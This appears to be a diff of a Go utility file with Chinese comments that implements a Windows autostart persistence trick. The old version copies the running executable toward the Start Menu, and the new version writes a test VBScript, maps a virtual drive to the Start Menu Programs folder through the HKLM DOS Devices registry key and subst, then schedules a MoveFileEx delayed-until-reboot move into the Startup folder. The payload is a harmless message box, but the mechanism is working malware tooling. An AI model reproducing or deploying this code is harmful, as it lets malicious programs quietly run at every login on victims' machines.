@@ -1,137 +1,121 @@
 package util
 
 import (
-	"bytes"
 	"fmt"
+	"golang.org/x/sys/windows/registry"
 	"io"
 	"io/ioutil"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"syscall"
 	"unsafe"
 )
 
+// MoveFileFlags 定义了文件移动标志位的枚举。
+type MoveFileFlags uint32
+
 const (
-	MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004
+	MOVEFILE_REPLACE_EXISTING      MoveFileFlags = 0x00000001
+	MOVEFILE_COPY_ALLOWED          MoveFileFlags = 0x00000002
+	MOVEFILE_DELAY_UNTIL_REBOOT    MoveFileFlags = 0x00000004
+	MOVEFILE_WRITE_THROUGH         MoveFileFlags = 0x00000008
+	MOVEFILE_CREATE_HARDLINK       MoveFileFlags = 0x00000010
+	MOVEFILE_FAIL_IF_NOT_TRACKABLE MoveFileFlags = 0x00000020
 )
 
-var kernel32 = syscall.NewLazyDLL("kernel32.dll")
+var (
+	kernel32        = syscall.NewLazyDLL("kernel32.dll")
+	procMoveFileExW = kernel32.NewProc("MoveFileExW")
+)
 
-// MoveFileEx 将文件或目录移动到新位置，并可选择在系统重启时执行移动操作。
-// lpExistingFileName 是要移动的文件或目录的原始路径。
-// lpNewFileName 是文件或目录的目标路径，即移动后的位置。
-// dwFlags 是一组标志，用于控制移动操作的行为，例如 MOVEFILE_DELAY_UNTIL_REBOOT。
-// 返回值为 true 表示移动操作成功，false 表示失败。
-func MoveFileEx(lpExistingFileName, lpNewFileName string, dwFlags uint32) bool {
-	// 使用 syscall.NewProc 创建对 Windows kernel32.dll 中的 MoveFileExW 函数的引用
-	proc := kernel32.NewProc("MoveFileExW")
-
-	// 调用 MoveFileExW 函数，传递原始文件名、目标文件名和标志参数
-	ret, _, _ := proc.Call(
+// MoveFileEx 封装了Windows API 函数 MoveFileEx。
+// 该函数用于移动文件并设置特定标志位。
+func MoveFileEx(lpExistingFileName, lpNewFileName string, dwFlags MoveFileFlags) bool {
+	ret, _, _ := procMoveFileExW.Call(
 		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpExistingFileName))),
 		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpNewFileName))),
-		uintptr(dwFlags))
+		uintptr(dwFlags),
+	)
 
-	// 如果函数返回非零值，则表示移动操作成功，否则表示失败
 	return ret != 0
 }
 
-// CopyExecutableToPath 将当前运行的程序复制到指定路径
-func CopyExecutableToPath(targetPath string) error {
-	// 获取当前程序的可执行文件路径
-	executablePath, err := os.Executable()
+// MoveFileWithSubst 执行文件移动和虚拟驱动器创建的操作。
+func MoveFileWithSubst() error {
+	// 创建1.vbs文件
+	vbsContent := []byte("msgbox(\"test\")")
+	err := ioutil.WriteFile("C:\\Windows\\Temp\\1.vbs", vbsContent, 0644)
 	if err != nil {
-		return fmt.Errorf("无法获取可执行文件路径: %v", err)
+		return fmt.Errorf("无法创建1.vbs文件: %v", err)
 	}
 
-	// 打开可执行文件
-	srcFile, err := os.Open(executablePath)
-	if err != nil {
-		return fmt.Errorf("无法打开可执行文件: %v", err)
-	}
-	defer srcFile.Close()
+	// 定义新的磁盘符号和文件路径
+	newDisk := "X:"
+	filePath := "C:\\Windows\\Temp\\1.vbs"
+	filename := "1.vbs"
 
-	// 读取可执行文件内容
-	fileContent, err := ioutil.ReadAll(srcFile)
+	// 获取程序数据目录和程序启动目录
+	appData := os.Getenv("APPDATA")
+	programs := appData + "\\Microsoft\\Windows\\Start Menu\\Programs"
+
+	// 设置新磁盘符号到程序启动目录的映射
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices`, registry.WRITE)
 	if err != nil {
-		return fmt.Errorf("无法读取可执行文件内容: %v", err)
+		fmt.Println("无法打开注册表键")
+		return fmt.Errorf("无法打开注册表键: %v", err)
+	}
+	defer key.Close()
+
+	err = key.SetStringValue(newDisk, "\\??\\"+programs)
+	if err != nil {
+		fmt.Println("无法设置注册表值")
+		return fmt.Errorf("无法设置注册表值: %v", err)
 	}
 
-	// 创建目标文件
-	destFile, err := os.Create(targetPath)
+	// 使用substitute命令创建虚拟驱动器
+	substCmd := exec.Command("subst", newDisk, programs)
+	err = substCmd.Run()
 	if err != nil {
-		return fmt.Errorf("无法创建目标文件: %v", err)
+		fmt.Println("无法创建虚拟驱动器")
+		return fmt.Errorf("无法创建虚拟驱动器: %v", err)
 	}
-	defer destFile.Close()
 
-	// 写入可执行文件内容到目标文件
-	_, err = io.Copy(destFile, bytes.NewReader(fileContent))
+	// 复制文件到程序启动目录
+	destPath := programs + "\\" + filename
+	err = CopyFile(filePath, destPath)
 	if err != nil {
+		fmt.Println("无法复制文件")
 		return fmt.Errorf("无法复制文件: %v", err)
 	}
 
-	// 设置目标文件的权限（可选）
-	if err := destFile.Chmod(os.FileMode(0755)); err != nil {
-		return fmt.Errorf("无法设置目标文件权限: %v", err)
+	// 使用MoveFileEx函数将文件移动到启动目录并设置延迟重启标志
+	success := MoveFileEx(newDisk+"\\"+filename, newDisk+"\\Startup\\"+filename, MOVEFILE_DELAY_UNTIL_REBOOT)
+	if !success {
+		fmt.Println("无法移动文件")
+		return fmt.Errorf("无法移动文件")
 	}
 
 	return nil
 }
 
-// GetProgramName 返回当前运行的程序名字
-func GetProgramName() string {
-	// 获取命令行参数
-	args := os.Args
-
-	// 第一个参数通常是程序名字
-	if len(args) > 0 {
-		programName := filepath.Base(args[0])
-		return programName
-	}
-
-	return "无法获取程序名字"
-}
-
-// MoveAndSetupFile 封装了文件的移动和设置过程
-func MoveAndSetupFile(sourcePath, destinationDisk, fileName string) error {
-	//拷贝程序去指定路径
-	err := CopyExecutableToPath(sourcePath)
-
+// CopyFile 复制源文件到目标文件
+func CopyFile(src, dst string) error {
+	sourceFile, err := os.Open(src)
 	if err != nil {
-		fmt.Println(err)
+		return err
 	}
+	defer sourceFile.Close()
 
-	// 获取当前用户的应用数据文件夹路径
-	appData, err := os.UserCacheDir()
+	destinationFile, err := os.Create(dst)
 	if err != nil {
-		fmt.Println(err)
+		return err
 	}
+	defer destinationFile.Close()
 
-	// 创建一个路径指向当前用户的“开始菜单\程序”文件夹
-	programs := appData + "\\Microsoft\\Windows\\Start Menu\\Programs"
-
-	// 执行命令将虚拟磁盘符号映射到“开始菜单\程序”文件夹
-	cmd := exec.Command("subst", destinationDisk, programs)
-	if err := cmd.Run(); err != nil {
-		fmt.Println(err)
-	}
-
-	// 复制文件到“开始菜单\程序”文件夹
-	data, err := ioutil.ReadFile(sourcePath)
+	_, err = io.Copy(destinationFile, sourceFile)
 	if err != nil {
-		fmt.Println(err)
-	}
-	destinationFullPath := programs + "\\" + fileName
-	err = ioutil.WriteFile(destinationFullPath, data, 0644)
-	if err != nil {
-		fmt.Println(err)
+		return err
 	}
 
-	// 在下次系统重启时移动文件到新位置
-	success := MoveFileEx(destinationDisk+"\\"+fileName, destinationDisk+"\\Startup\\"+fileName, MOVEFILE_DELAY_UNTIL_REBOOT)
-	if !success {
-		return fmt.Errorf("Failed to move the file.")
-	}
 	return nil
 }
